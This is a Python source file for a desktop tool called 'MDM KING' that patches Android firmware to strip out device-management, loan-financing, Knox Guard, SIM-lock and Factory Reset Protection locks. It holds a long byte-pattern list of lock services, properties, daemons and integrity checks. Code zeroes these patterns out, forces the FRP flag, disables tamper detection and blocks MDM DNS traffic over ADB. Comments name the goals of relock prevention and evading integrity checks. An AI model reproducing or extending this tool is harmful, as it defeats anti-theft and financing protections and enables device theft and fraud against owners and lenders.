"""
MDM KING — Professional Firmware Security Tool
"""
import faulthandler
faulthandler.enable()
import sys as _sys
if _sys.platform == 'win32':
    import subprocess as _sp
    _sp_run = _sp.run
    def _run_silent(*args, **kwargs):
        if 'creationflags' not in kwargs:
            kwargs['creationflags'] = 0x08000000
        return _sp_run(*args, **kwargs)
    _sp.run = _run_silent
import tkinter as tk
from tkinter import ttk, filedialog, messagebox
import os, sys, subprocess, threading, time, re, struct, tempfile, math, zlib, io, webbrowser, json, datetime, urllib.request, shutil, concurrent.futures, hashlib, smtplib, email.mime.text, email.mime.multipart

from auth import (_hash_password,
    _check_password, _migrate_password, _get_machine_id)
from cloudflare import (CLOUDFLARE_API_URL,
    sync_upload, sync_download, _write_config, fetch_config,
    validate_license, write_log)
from patcher import (NEONS, _semver_gt, FastPatternFinder,
    ALL_HEX_PATTERNS, PROD_SEC_PATTERNS, MTK_FP_PATTERNS, PRIV_APP_PATTERNS,
    MTK_PCS_PATTERNS, PCS_APKOAT_PATTERNS, SEC_ODEX_PATTERNS, CHIPSET_PACKAGES,
    _parse_remote_patterns, _merge_remote_patterns,
    _strip_slot_suffix, _detect_vabc_super)
from adb import StartAdb, AppMutex, ProcessParallel, IsLinePrefixClean
_HAS_SERIAL = False
_HAS_PIL = False

# Global crash logger — catches any unhandled exception and writes to file
_CRASH_LOG = os.path.join(os.path.dirname(os.path.abspath(__file__ or '.')), 'mdm_king_crash.log')
def _crash_logger(exc_type, exc_value, exc_tb):
    import traceback
    try:
        with open(_CRASH_LOG, 'w') as f:
            f.write(f'Unhandled {exc_type.__name__}: {exc_value}\n')
            traceback.print_exception(exc_type, exc_value, exc_tb, file=f)
    except Exception: pass
sys.excepthook = _crash_logger
def _thread_crash_logger(args):
    _crash_logger(args.exc_type, args.exc_value, args.exc_traceback)
threading.excepthook = _thread_crash_logger
try:
    import serial.tools.list_ports
    _HAS_SERIAL = True
except Exception: pass
try:
    from PIL import Image, ImageTk, ImageDraw
    _HAS_PIL = True
except Exception: pass

def _asset(path):
    if getattr(sys, 'frozen', False):
        if path == 'config.json':
            base = os.path.dirname(sys.executable)
            sibling = os.path.join(os.path.dirname(base), 'config.json')
            target = os.path.join(base, 'config.json')
            if os.path.isfile(sibling) and not os.path.isfile(target):
                try:
                    import shutil; shutil.copy2(sibling, target)
                except Exception: pass
            if os.path.isfile(sibling) and os.path.isfile(target):
                try:
                    with open(sibling) as f: s_cfg = json.load(f)
                    with open(target) as f: t_cfg = json.load(f)
                    s_users = len(s_cfg.get('users', {}))
                    t_users = len(t_cfg.get('users', {}))
                    if s_users > t_users:
                        import shutil; shutil.copy2(sibling, target)
                except Exception: pass
            return target
        base = sys._MEIPASS
        full = os.path.join(base, path)
        if os.path.exists(full):
            return full
        parent = os.path.join(os.path.dirname(sys.executable), path)
        if os.path.exists(parent):
            return parent
        return None
    base = os.path.dirname(os.path.abspath(__file__))
    full = os.path.join(base, path)
    if os.path.exists(full):
        return full
    parent = os.path.join(os.path.dirname(base), path)
    if os.path.exists(parent):
        return parent
    return None

# Verified same-length MDM removal patterns (zero corruption, no bootloop)
MDM_PATTERNS = [
    b'com.scorpio.securitycom', b'com.scorpio.securitycompanion', b'com.scorpio.securityservice',
    b'com.scorpio.securityupdate', b'com.scorpio.securitymonitor', b'com.scorpio.secureconfig',
    b'com.scorpio.security', b'com.transsion.security', b'com.itel.security',
    b'com.tecno.security', b'com.infinix.security',
    b'scorpio_securitycom', b'scorpio_securitycompanion', b'scorpio_security', b'scorpio_secure', b'scp_security',
    b'ScorpioSecurityManager',
    b'enterpriseMDM', b'EnterpriseMdm', b'DeviceLockService',
    b'persist.security.', b'persist.mdm.', b'persist.sys.mdm',
    b'persist.sys.knox', b'persist.vendor.knox', b'persist.security.knox',
    b'persist.vendor.sys.knox', b'persist.vendor.sys.security',
    b'sys.knox', b'sys.mdm', b'sys.security.knox',
    b'ro.knox', b'ro.config.knox', b'ro.boot.knox',
    b'ro.boot.mdm_state', b'ro.boot.lock_state',
    b'kg.status', b'kg_state', b'knox_guard',
    b'SPLock', b'SIMLOCK', b'SimLock', b'sim_lock',
    b'MODEM_LOCK', b'MDM_LOCK', b'LOCK_STATUS', b'lock_state',
    b'AT+SPLOCK', b'AT+CLCK', b'+SPLOCK:', b'SIM LOCK',
    b'FinanceLockService', b'EasyPayService', b'EasyBuyService',
    b'InstallmentService', b'RemoteLockService', b'DeviceAdminService',
    b'scp_securityd', b'scorpiod', b'security_daemon', b'persist_lockd',
    b'transsion_security', b'sprd_mdm_lock', b'network_lock',
    b'factorylock', b'simme_lock', b'subsidy_lock',
    b'persist.vendor.mdm', b'persist.vendor.sec', b'persist.vendor.lock',
    b'unisoc.security', b'unisoc.mdm', b'sprd.security', b'sprd_lock',
    b'scorpio.lock', b'scorpio.mdm', b'mdm_locked', b'mdm_active',
    b'mdm_enforce', b'lock_active', b'lock_enabled', b'lock_set',
    b'AT+ESLOCK', b'AT+SIMLOCK', b'AT+ESIMLOCK',
    b'LoanLock', b'LoanService', b'CreditLock', b'CreditService',
    b'fota_locked', b'fota_lock', b'diag_lock', b'diag_locked',
    b'carrier_lock', b'omadm_lock', b'omadm_locked',
    b'SCORPIO_KEY', b'SCORPIO_PIN', b'SCORPIO_TOKEN',
    b'securitycom.apk', b'securitycom.odex', b'securitycom.vdex',
    b'securitycom.art', b'securitycom.oat',
    b'SecurityPlugin.odex', b'SecurityPlugin.vdex', b'SecurityPlugin.art',
    b'securityplugin.odex', b'securityplugin.vdex', b'securityplugin.art',
    # FRP disable
    b'wifi_required=true', b'wifi_required',
    b'frp_state=0',
    b'SecurityCom.apk', b'SecurityCom.odex', b'SecurityCom.vdex',
    b'/product/priv-app/SecurityCom/SecurityCom.apk',
    b'product/priv-app/SecurityCom/SecurityCom.apk',
    b'/product/priv-app/securitycom/',
    b'/product/priv-app/SecurityPlugin/',
    b'/product/app/securitycom/',
    b'/product/app/SecurityPlugin/',
    b'/system_ext/priv-app/securitycom/',
    b'/system_ext/priv-app/SecurityPlugin/',
    b'/system_ext/app/securitycom/',
    b'/system_ext/app/SecurityPlugin/',
    b'/system/priv-app/securitycom/',
    b'/system/priv-app/SecurityPlugin/',
    b'/system/app/securitycom/',
    b'/system/app/SecurityPlugin/',
    b'/vendor/priv-app/securitycom/',
    b'/vendor/priv-app/SecurityPlugin/',
    b'/vendor/app/securitycom/',
    b'/vendor/app/SecurityPlugin/',
    b'/product/etc/permissions/com.scorpio.securitycom.xml',
    b'/system_ext/etc/permissions/com.scorpio.securitycom.xml',
    b'/system/etc/permissions/com.scorpio.securitycom.xml',
    b'/vendor/etc/permissions/com.scorpio.securitycom.xml',
    # Companion APK dir paths — all partitions (product, system_ext, system, vendor)
    b'/product/priv-app/securitycompanion/',
    b'/system_ext/priv-app/securitycompanion/',
    b'/system/priv-app/securitycompanion/',
    b'/vendor/priv-app/securitycompanion/',
    b'/product/priv-app/securityservice/',
    b'/system_ext/priv-app/securityservice/',
    b'/system/priv-app/securityservice/',
    b'/vendor/priv-app/securityservice/',
    b'/product/priv-app/securityupdate/',
    b'/system_ext/priv-app/securityupdate/',
    b'/system/priv-app/securityupdate/',
    b'/vendor/priv-app/securityupdate/',
    b'/product/priv-app/securitymonitor/',
    b'/system_ext/priv-app/securitymonitor/',
    b'/system/priv-app/securitymonitor/',
    b'/vendor/priv-app/securitymonitor/',
    b'/product/app/secureconfig/',
    b'/system_ext/app/secureconfig/',
    b'/system/app/secureconfig/',
    b'/vendor/app/secureconfig/',
    b'com.scorpio.privatecomp', b'scorpio.privatecomp', b'privatecomp',
    b'wrapper_classes.dex', b'wrapper_classes2.dex',
    b'samsung.security', b'samsung.knox', b'samsung.mdm',
    b'sec_sdcard_lock', b'no_firmware_recovery',
    b'vendor.samsung.security', b'vendor.samsung.knox',
    b'sec_knox_guard', b'knox_guard_status',
    b'knox_guard_service', b'knox_guard_daemon',
    b'sec_ro.knox', b'sec.knox', b'knox.zt',
    # UTF-16 LE encoded Scorpio strings (critical for relock)
    b's\x00e\x00c\x00u\x00r\x00i\x00t\x00y\x00c\x00o\x00m\x00.\x00a\x00p\x00k\x00',
    b's\x00e\x00c\x00u\x00r\x00i\x00t\x00y\x00c\x00o\x00m\x00.\x00o\x00d\x00e\x00x\x00',
    b'c\x00o\x00m\x00.\x00s\x00c\x00o\x00r\x00p\x00i\x00o\x00.\x00s\x00e\x00c\x00u\x00r\x00i\x00t\x00y\x00c\x00o\x00m\x00',
    b'c\x00o\x00m\x00.\x00s\x00c\x00o\x00r\x00p\x00i\x00o\x00.\x00s\x00e\x00c\x00u\x00r\x00i\x00t\x00y\x00c\x00o\x00m\x00p\x00a\x00n\x00i\x00o\x00n\x00',
    b'c\x00o\x00m\x00.\x00s\x00c\x00o\x00r\x00p\x00i\x00o\x00.\x00s\x00e\x00c\x00u\x00r\x00i\x00t\x00y\x00s\x00e\x00r\x00v\x00i\x00c\x00e\x00',
    b'c\x00o\x00m\x00.\x00s\x00c\x00o\x00r\x00p\x00i\x00o\x00.\x00s\x00e\x00c\x00u\x00r\x00i\x00t\x00y\x00p\x00l\x00u\x00g\x00i\x00n\x00',
    b'c\x00o\x00m\x00.\x00s\x00c\x00o\x00r\x00p\x00i\x00o\x00.\x00s\x00e\x00c\x00u\x00r\x00i\x00t\x00y\x00u\x00p\x00d\x00a\x00t\x00e\x00',
    b'c\x00o\x00m\x00.\x00s\x00c\x00o\x00r\x00p\x00i\x00o\x00.\x00s\x00e\x00c\x00u\x00r\x00i\x00t\x00y\x00m\x00o\x00n\x00i\x00t\x00o\x00r\x00',
    b'c\x00o\x00m\x00.\x00s\x00c\x00o\x00r\x00p\x00i\x00o\x00.\x00s\x00e\x00c\x00u\x00r\x00i\x00t\x00y\x00w\x00a\x00t\x00c\x00h\x00d\x00o\x00g\x00',
    b'c\x00o\x00m\x00.\x00s\x00c\x00o\x00r\x00p\x00i\x00o\x00.\x00s\x00e\x00c\x00u\x00r\x00i\x00t\x00y\x00c\x00o\x00n\x00f\x00i\x00g\x00',
    b'c\x00o\x00m\x00.\x00s\x00c\x00o\x00r\x00p\x00i\x00o\x00.\x00s\x00e\x00c\x00u\x00r\x00i\x00t\x00y\x00',
    # UTF-16 LE persist/ro lock property names (for AXML/DEX string tables)
    b'p\x00e\x00r\x00s\x00i\x00s\x00t\x00.\x00s\x00y\x00s\x00.\x00o\x00o\x00b\x00e\x00.\x00d\x00e\x00v\x00i\x00c\x00e\x00l\x00o\x00c\x00k\x00',
    b'p\x00e\x00r\x00s\x00i\x00s\x00t\x00.\x00s\x00y\x00s\x00.\x00o\x00o\x00b\x00e\x00',
    b'p\x00e\x00r\x00s\x00i\x00s\x00t\x00.\x00s\x00y\x00s\x00.\x00s\x00i\x00m\x00_\x00l\x00o\x00c\x00k\x00e\x00d\x00',
    b'r\x00o\x00.\x00t\x00r\x00a\x00n\x00_\x00a\x00n\x00t\x00i\x00_\x00s\x00p\x00e\x00c\x00',
    b'r\x00o\x00.\x00t\x00r\x00a\x00n\x00_\x00a\x00n\x00t\x00i\x00_\x00n\x00v\x00_\x00r\x00e\x00c\x00o\x00v\x00e\x00r\x00',
    b'r\x00o\x00.\x00t\x00r\x00a\x00n\x00_\x00a\x00n\x00t\x00i\x00_\x00m\x00o\x00n\x00i\x00t\x00o\x00r\x00',
    b'r\x00o\x00.\x00t\x00r\x00a\x00n\x00_\x00p\x00t\x00_\x00r\x00e\x00m\x00o\x00t\x00e\x00_\x00l\x00o\x00c\x00k\x00',
    b'r\x00o\x00.\x00b\x00o\x00o\x00t\x00.\x00l\x00o\x00c\x00k\x00_\x00s\x00t\x00a\x00t\x00e\x00',
    b'r\x00o\x00.\x00b\x00o\x00o\x00t\x00.\x00m\x00d\x00m\x00_\x00s\x00t\x00a\x00t\x00e\x00',
    b'r\x00o\x00.\x00t\x00r\x00a\x00n\x00s\x00e\x00c\x00u\x00r\x00i\x00t\x00y\x00',
    # SPD/Unisoc BG6M additional patterns
    b'com.sprd.mdm', b'com.sprd.security', b'sprd.mdm', b'sprd.security',
    b'persist.vendor.sys.mdm', b'persist.vendor.sys.security',
    b'sys.mdm.lock', b'vendor.mdm.lock', b'sys.security.lock',
    b'AT+MDMLOCK', b'AT+SPMDMLOCK', b'AT+SPLOCK?',
    b'SPD_LOCK', b'UNISOC_LOCK', b'spd_lock', b'bg6m_lock',
    b'mdm_policy', b'mdm_config', b'mdm_state', b'mdm_status',
    b'sec_lock', b'security_policy', b'lock_policy',
    b'persist.sys.security', b'persist.vendor.security',
    b'vendor.unisoc.security', b'vendor.unisoc.mdm',
    b'mdm_trigger', b'lock_trigger', b'relock_cmd',
    b'AT+FRPLOCK', b'AT+NETLOCK', b'AT+CPLOCK',
    b'sprd_secure_storage', b'sprd_keystore',
    b'device_admin_policy', b'managed_config',
    b'enterprise_policy', b'eap_policy',
    b'LockScreenService', b'LockCheckService',
    b'persist.sys.oobe.devicelock', b'persist.sys.oobe', b'persist.sys.sim_locked',
    b'ro.griffin.core', b'ro.griffin.pm', b'ro.griffin.support',
    b'ro.tran_anti_spec', b'ro.tran_anti_nv_recover', b'ro.tran_anti_monitor',
    b'ro.tran.pt_remote_lock', b'ro.os.securitycom', b'ro.simlock.onekey',
    b'ro.boot.lock_state', b'ro.boot.mdm_state',
    b'vendor.oppo.mdm', b'vendor.vivo.mdm', b'vendor.xiaomi.mdm',
    # Safe text-only patterns — no bootloop/corruption
    b'ro.mdm', b'ro.region.', b'ro.country.', b'persist.sys.region',
    b'lock_status', b'device_locked',
    # 2026 Transsion new lock mechanisms
    b'transecurity', b'tne_service', b'phasecheck_server',
    b'uniber', b'tool_service', b'uniview', b'uniresctlopt',
    b'tranlog', b'tnevservice', b'trancriticalparavfy',
    b'persist.sys.trancritical', b'ro.transecurity',
    b'persist.vendor.transecurity',
    b'ro.phoenix', b'persist.sys.phoenix',
    b'persist.sys.cota', b'ro.cota',
    b'persist.sys.tne', b'ro.tne',
    # SecurityPlugin — newer Transsion lock mechanism (also on SPD)
    b'com.transsion.securityplugin', b'SecurityPlugin', b'securityplugin',
    b'SecurityPlugin.apk', b'securityplugin.apk', b'SecurityPluginService',
    b'com.transsion.securityplugin.service', b'com.transsion.securityplugin.receiver',
    b'Lcom/transsion/securityplugin/',
    b'securityplugin.jar', b'SecurityPlugin.jar',
    b'/product/priv-app/SecurityPlugin/SecurityPlugin.apk',
    # ITEL-specific packages and services
    b'com.itel.security', b'com.itel.scorpio', b'com.itel.lock',
    b'com.itel.fota', b'com.itel.mdm', b'com.itel.secure',
    b'ItelSecurity', b'ItelSecurity.apk', b'itelsecurity',
    b'com.itel.security.BootReceiver',
    b'com.itel.security.LockService',
    b'com.itel.security.MdmService',
    # Init RC files that start lock daemons
    b'scorpio.rc', b'scorboot.rc', b'security.rc',
    b'transecurity.rc', b'phasecheck.rc',
    b'itel_security.rc', b'itel_lock.rc',
    b'bg6m.rc', b'persist_lock.rc',
    b'service scorpiod', b'service security_daemon',
    b'service persist_lockd', b'service bg6m_lockd',
    b'service scp_securityd', b'service transecurityd',
    # SPD/Unisoc boot-time lock check override
    b'ro.boot.lock_state=locked', b'ro.boot.lock_state=lock',
    b'ro.boot.mdm_state=locked', b'ro.boot.mdm_state=lock',
    b'ro.boot.mdm_state=enabled',
    # SPD NV item lock patterns
    b'SPD_LOCK_CTRL', b'SPD_LOCK_STATUS', b'SPD_MDM_CTRL',
    b'persist.sys.spd.lock', b'ro.spd.lock',
    b'vendor.unisoc.lock', b'ro.unisoc.lock',
    # DEX class paths — prevents all SecurityCom components from loading
    b'Lcom/scorpio/securitycom/BootReceiver;',
    b'Lcom/scorpio/securitycom/AlarmReceiver;',
    b'Lcom/scorpio/securitycom/MdmService;',
    b'Lcom/scorpio/securitycom/DeviceAdminReceiver;',
    b'Lcom/scorpio/securitycom/LockService;',
    b'Lcom/scorpio/securitycom/MainService;',
    b'Lcom/scorpio/securitycom/UpdateReceiver;',
    b'Lcom/scorpio/securitycom/RemoteLockService;',
    b'Lcom/scorpio/securitycom/FinanceLockService;',
    # Companion package DEX class paths (scorpio.securitycompanion, etc.)
    b'Lcom/scorpio/securitycompanion/', b'Lcom/scorpio/securitycompanion/BootReceiver;',
    b'Lcom/scorpio/securitycompanion/MonitorService;',
    b'Lcom/scorpio/securityservice/', b'Lcom/scorpio/securityservice/MainService;',
    b'Lcom/scorpio/securityservice/LockService;',
    b'Lcom/scorpio/securityplugin/', b'Lcom/scorpio/securityplugin/PluginService;',
    b'Lcom/scorpio/securityupdate/', b'Lcom/scorpio/securitymonitor/',
    b'Lcom/scorpio/securitywatchdog/', b'Lcom/scorpio/secureconfig/',
    b'Lcom/scorpio/securityupdate/UpdateService;',
    b'Lcom/scorpio/securitymonitor/MonitorService;',
    b'Lcom/scorpio/securitywatchdog/WatchdogService;',
    b'Lcom/scorpio/secureconfig/ConfigService;',
    # UTF-16 LE DEX class paths
    b'L\x00c\x00o\x00m\x00/\x00s\x00c\x00o\x00r\x00p\x00i\x00o\x00/\x00s\x00e\x00c\x00u\x00r\x00i\x00t\x00y\x00c\x00o\x00m\x00/\x00B\x00o\x00o\x00t\x00R\x00e\x00c\x00e\x00i\x00v\x00e\x00r\x00;\x00',
    b'L\x00c\x00o\x00m\x00/\x00s\x00c\x00o\x00r\x00p\x00i\x00o\x00/\x00s\x00e\x00c\x00u\x00r\x00i\x00t\x00y\x00c\x00o\x00m\x00/\x00M\x00d\x00m\x00S\x00e\x00r\x00v\x00i\x00c\x00e\x00;\x00',
    # Java dot-notation class names (in AndroidManifest XML)
    b'com.scorpio.securitycom.BootReceiver',
    b'com.scorpio.securitycom.AlarmReceiver',
    b'com.scorpio.securitycom.DeviceAdminReceiver',
    b'com.scorpio.securitycom.LockService',
    b'com.scorpio.securitycom.MainService',
    b'com.scorpio.securitycom.RemoteLockService',
    # Companion package dot-notation class names
    b'com.scorpio.securitycompanion.BootReceiver',
    b'com.scorpio.securitycompanion.MonitorService',
    b'com.scorpio.securityservice.MainService',
    b'com.scorpio.securityservice.LockService',
    b'com.scorpio.securityplugin.PluginService',
    b'com.scorpio.securityupdate.UpdateService',
    b'com.scorpio.securitymonitor.MonitorService',
    b'com.scorpio.securitywatchdog.WatchdogService',
    b'com.scorpio.secureconfig.ConfigService',
    b'com.transsion.security.BootReceiver',
    b'com.itel.security.BootReceiver',
    b'com.tecno.security.BootReceiver',
    # Daemon binary paths — prevents init from starting them (safe strings only)
    b'/vendor/bin/scorpiod',
    b'/vendor/bin/security_daemon',
    b'/vendor/bin/persist_lockd',
    b'/vendor/bin/bg6m_lockd',
    # Framework class paths (system server components)
    b'Lcom/android/server/ScorpioLockService;',
    b'Lcom/android/server/security/ScorpioManagerService;',
    # Transsion/ITEL framework-level constants and classes used via bytecode
    b'LockConfig', b'LockConfig$', b'LockManager', b'LockManager$',
    b'IS_LOCKED', b'IS_LOCK', b'MDM_LOCKED', b'IS_MDM_LOCKED',
    b'isDeviceLocked', b'isMdmLocked', b'isLockRequired',
    b'enforceLock', b'applyLock', b'lockDevice',
    b'getLockState', b'getMdmState', b'readLockState',
    b'KEY_LOCK_STATE', b'LOCK_STATE', b'MDM_STATE',
    b'persist.sys.scorpio', b'persist.vendor.scorpio',
    b'sys.scorpio.lock', b'vendor.scorpio.lock',
    b'ro.build.scorpio', b'ro.scorpio.version',
    b'com.transsion.scorpio', b'com.transsion.toolservice',
    b'com.transsion.phasecheck', b'com.transsion.uniber',
    b'com.transsion.tne', b'com.transsion.cota',
    # Runtime constant class references used by framework
    b'Lcom/transsion/security/LockConfig;',
    b'Lcom/transsion/security/LockManager;',
    b'Lcom/itel/security/LockConfig;',
    b'Lcom/itel/security/LockManager;',
    b'Lcom/transsion/security/MdmService;',
    b'Lcom/itel/security/MdmService;',
    # Transsion system server classes
    b'Lcom/android/server/tran/TranLockService;',
    b'Lcom/android/server/tran/TranSecurityService;',
    b'Lcom/android/server/tran/TranMdmService;',
    # Additional ITEL/SPD daemon names (prevent startup via RC files)
    b'service itel_lockd', b'service spd_lockd', b'service unisoc_lockd',
    b'service mdm_monitord', b'service lockd', b'service spd_security',
    b'service bg6m_security', b'service sprd_lockd',
    # start commands for all lock daemons (in RC files)
    b'start scorpiod', b'start security_daemon', b'start persist_lockd',
    b'start bg6m_lockd', b'start scp_securityd', b'start transecurityd',
    b'start phoenixd', b'start cotad', b'start itel_lockd',
    b'start spd_lockd', b'start unisoc_lockd', b'start lockd',
    b'start spd_security', b'start mdm_monitord',
    # exec commands that start lock daemons
    b'exec /vendor/bin/scorpiod', b'exec /vendor/bin/security_daemon',
    b'exec /vendor/bin/persist_lockd', b'exec /vendor/bin/bg6m_lockd',
    b'exec /vendor/bin/scp_securityd', b'exec /vendor/bin/transecurityd',
    b'exec /vendor/bin/phoenixd', b'exec /vendor/bin/cotad',
    b'exec /vendor/bin/itel_lockd', b'exec /vendor/bin/spd_lockd',
    # Daemon binary paths (appears in shell scripts, configs, manifest)
    b'/vendor/bin/itel_lockd', b'/vendor/bin/spd_lockd',
    b'/vendor/bin/unisoc_lockd', b'/vendor/bin/mdm_monitord',
    b'/vendor/bin/lockd', b'/vendor/bin/spd_security',
    b'/vendor/bin/bg6m_security', b'/vendor/bin/sprd_lockd',
    # SPD/Unisoc NV read/write daemon paths
    b'/vendor/bin/nvitemd', b'/vendor/bin/nv_daemon',
    b'/vendor/bin/mdm_nv_daemon',
    # CRITICAL: ITEL A90 SPD trancriticalparavfy daemon paths (missing before)
    b'/vendor/bin/trancriticalparavfy',
    b'vendor/bin/trancriticalparavfy',
    b'/vendor/bin/trancriticalparavfy_service',
    b'vendor/bin/trancriticalparavfy_service',
    # Init service definition + start/exec commands
    b'service trancriticalparavfy_service',
    b'service trancriticalparavfy',
    b'start trancriticalparavfy_service',
    b'start trancriticalparavfy',
    b'exec /vendor/bin/trancriticalparavfy',
    b'exec /vendor/bin/trancriticalparavfy_service',
    # ─── RELOCK PREVENTION: Full property value patterns ───
    b'persist.sys.mdm=1', b'persist.sys.mdm=true', b'persist.sys.mdm=locked',
    b'persist.sys.oobe.devicelock=1', b'persist.sys.oobe.devicelock=true',
    b'persist.sys.oobe=1', b'persist.sys.oobe_complete=1',
    b'ro.boot.mdm_state=locked', b'ro.boot.mdm_state=lock',
    b'ro.boot.lock_state=locked', b'ro.boot.lock_state=lock',
    b'ro.boot.mdm_state=enabled', b'ro.boot.mdm=enabled',
    b'ro.transsion.mdm=1', b'ro.transsion.mdm=true',
    b'persist.vendor.transsion.mdm=1', b'ro.vendor.transsion.mdm=1',
    b'persist.sys.trancritical=1', b'ro.transecurity=1',
    b'persist.vendor.transecurity=1', b'ro.phoenix=1',
    b'persist.sys.phoenix=1', b'persist.sys.cota=1',
    b'ro.cota=1', b'persist.sys.tne=1', b'ro.tne=1',
    # ─── FULL RC SERVICE LINES (disable at source) ───
    b'service scorpiod /vendor/bin/scorpiod',
    b'service security_daemon /vendor/bin/security_daemon',
    b'service persist_lockd /vendor/bin/persist_lockd',
    b'service bg6m_lockd /vendor/bin/bg6m_lockd',
    b'service scp_securityd /vendor/bin/scp_securityd',
    b'service transecurityd /vendor/bin/transecurityd',
    b'service phoenixd /vendor/bin/phoenixd',
    b'service cotad /vendor/bin/cotad',
    b'service itel_lockd /vendor/bin/itel_lockd',
    b'service spd_lockd /vendor/bin/spd_lockd',
    b'service unisoc_lockd /vendor/bin/unisoc_lockd',
    b'service lockd /vendor/bin/lockd',
    b'service spd_security /vendor/bin/spd_security',
    b'service mdm_monitord /vendor/bin/mdm_monitord',
    b'service trancriticalparavfy /vendor/bin/trancriticalparavfy',
    # ─── XML PERMISSION FILES (prevents permission grants) ───
    b'com.scorpio.securitycom.xml',
    b'com.transsion.mdm.xml',
    b'com.scorpio.permission.xml',
    b'scorpio_whitelist.xml',
    b'scorpio_permissions.xml',
    b'com.transsion.security.xml',
    b'com.transsion.securityplugin.xml',
    b'com.transsion.phasecheck.xml',
    b'com.transsion.uniber.xml',
    b'com.itel.security.xml',
    b'com.itel.scorpio.xml',
    b'com.itel.mdm.xml',
    b'com.tecno.security.xml',
    b'com.infinix.security.xml',
    b'bg6m_permissions.xml',
    b'sprd_mdm_permissions.xml',
    b'com.unisoc.mdm.xml',
    # ─── DEX METHOD SIGNATURES (NOP lock-check bytecode in framework) ───
    b'Lcom/transsion/security/LockConfig;->isLocked',
    b'Lcom/transsion/security/LockConfig;->enforceLock',
    b'Lcom/transsion/security/LockConfig;->applyLock',
    b'Lcom/transsion/security/LockManager;->getLockState',
    b'Lcom/transsion/security/LockManager;->isDeviceLocked',
    b'Lcom/itel/security/LockConfig;->isLocked',
    b'Lcom/itel/security/LockConfig;->enforceLock',
    b'Lcom/scorpio/securitycom/MdmService;->checkLock',
    b'Lcom/scorpio/securitycom/MdmService;->enforceMdm',
    b'Lcom/scorpio/securitycom/MdmService;->relockDevice',
    b'Lcom/scorpio/securitycom/LockService;->relock',
    b'Lcom/scorpio/securitycom/LockService;->setLockState',
    b'Lcom/scorpio/securitycom/LockService;->enforceLock',
    b'Lcom/scorpio/securitycom/DeviceAdminReceiver;->onEnabled',
    b'Lcom/scorpio/securitycom/BootReceiver;->onReceive',
    b'Lcom/scorpio/securitycom/AlarmReceiver;->onReceive',
    b'Lcom/scorpio/securitycompanion/MonitorService;->checkIntegrity',
    b'Lcom/scorpio/securitycompanion/MonitorService;->relockIfTampered',
    b'Lcom/scorpio/securityplugin/PluginService;->onBind',
    b'Lcom/scorpio/securityplugin/PluginService;->enforcePolicy',
    # ─── UTF-16 FULL PROPERTY VALUES (DEX string tables) ───
    b'p\x00e\x00r\x00s\x00i\x00s\x00t\x00.\x00s\x00y\x00s\x00.\x00m\x00d\x00m\x00=\x001\x00',
    b'p\x00e\x00r\x00s\x00i\x00s\x00t\x00.\x00s\x00y\x00s\x00.\x00o\x00o\x00b\x00e\x00.\x00d\x00e\x00v\x00i\x00c\x00e\x00l\x00o\x00c\x00k\x00=\x001\x00',
    b'r\x00o\x00.\x00b\x00o\x00o\x00t\x00.\x00m\x00d\x00m\x00_\x00s\x00t\x00a\x00t\x00e\x00=\x00l\x00o\x00c\x00k\x00e\x00d\x00',
    b'r\x00o\x00.\x00b\x00o\x00o\x00t\x00.\x00l\x00o\x00c\x00k\x00_\x00s\x00t\x00a\x00t\x00e\x00=\x00l\x00o\x00c\x00k\x00e\x00d\x00',
    b'r\x00o\x00.\x00t\x00r\x00a\x00n\x00s\x00e\x00c\x00u\x00r\x00i\x00t\x00y\x00=\x001\x00',
    b'r\x00o\x00.\x00p\x00h\x00o\x00e\x00n\x00i\x00x\x00=\x001\x00',
    b'p\x00e\x00r\x00s\x00i\x00s\x00t\x00.\x00s\x00y\x00s\x00.\x00p\x00h\x00o\x00e\x00n\x00i\x00x\x00=\x001\x00',
    b'p\x00e\x00r\x00s\x00i\x00s\x00t\x00.\x00s\x00y\x00s\x00.\x00t\x00r\x00a\x00n\x00c\x00r\x00i\x00t\x00i\x00c\x00a\x00l\x00=\x001\x00',
    b'r\x00o\x00.\x00t\x00r\x00a\x00n\x00s\x00e\x00c\x00u\x00r\x00i\x00t\x00y\x00=\x001\x00',
    # ─── SELINUX POLICY LABELS (block daemon permissions) ───
    b'scorpio_domain', b'scp_security_domain', b'persist_lock_domain',
    b'bg6m_lock_domain', b'transecurity_domain', b'phoenix_domain',
    b'cota_domain', b'mdm_daemon_domain', b'security_daemon_domain',
    b'trancriticalparavfy_domain',
    # ─── WATCHDOG INTEGRITY CHECK (prevents tamper detection) ───
    b'integrity_check', b'tamper_detected', b'security_integrity',
    b'verify_integrity', b'check_signature', b'verify_checksum',
    b'validate_patch', b'detect_modification',
    b'persist.sys.integrity', b'ro.boot.verifiedbootstate',
    b'verifiedbootstate=orange', b'verifiedbootstate=yellow',
]
MDM_REPLACEMENTS = []
for p in MDM_PATTERNS:
    if p == b'frp_state=0':
        MDM_REPLACEMENTS.append(b'frp_state=1')
    else:
        _r = bytearray(p)
        if len(p) > 1:
            # Preserve first byte (text files won't corrupt), zero rest
            _r[1:] = b'\x00' * (len(p) - 1)
        MDM_REPLACEMENTS.append(bytes(_r))

# ─── FastPatternFinder — Knox Wizard-style hex pattern engine v2 ───
# ─── WipeRange — Knox Wizard-style range-based wiping ───
class WipeRange:
    """Clean range-based zeroing with auto-merge."""
    def __init__(self, data, file_start=0):
        self._data = data
        self._file_start = file_start
        self._ranges = []
    def add(self, zs, ze):
        if zs < ze: self._ranges.append((zs, ze))
    def add_from_hits(self, hits, margin=0):
        for off, pat in hits:
            pb = pat['bytes']
            zs = off - margin
            ze = off + len(pb) + margin
            self._ranges.append((max(0, zs), ze))
    def merge(self):
        if not self._ranges: return []
        self._ranges.sort()
        merged = [self._ranges[0]]
        for r in self._ranges[1:]:
            if r[0] <= merged[-1][1]:
                merged[-1] = (merged[-1][0], max(merged[-1][1], r[1]))
            else: merged.append(r)
        return merged
    def commit(self):
        """Merge overlapping ranges and zero them in data. Returns byte count."""
        merged = self.merge()
        total = 0
        for zs, ze in merged:
            lo = max(zs - self._file_start, 0)
            hi = min(ze - self._file_start, len(self._data))
            if lo < hi:
                self._data[lo:hi] = b'\x00' * (hi - lo)
                total += hi - lo
        return total

# ─── _adb_block_dns — Knox Wizard-style DNS lock (replaces 12 duplicated blocks) ───
def _adb_block_dns(adb, serial, lock=False, device_config=False, disable_acts=True, flags=0):
    """Lock MDM DNS channels by disabling settings activities + pinning DNS to 6wg6tplqrx.dns.controld.com."""
    if disable_acts:
        for act in ['com.android.settings/.Settings\\$PrivateDnsModeSettingsActivity',
                     'com.android.settings/.Settings\\$PrivateDnsSettingsActivity',
                     'com.android.settings/.Settings\\$PrivacyDnsSettingsActivity']:
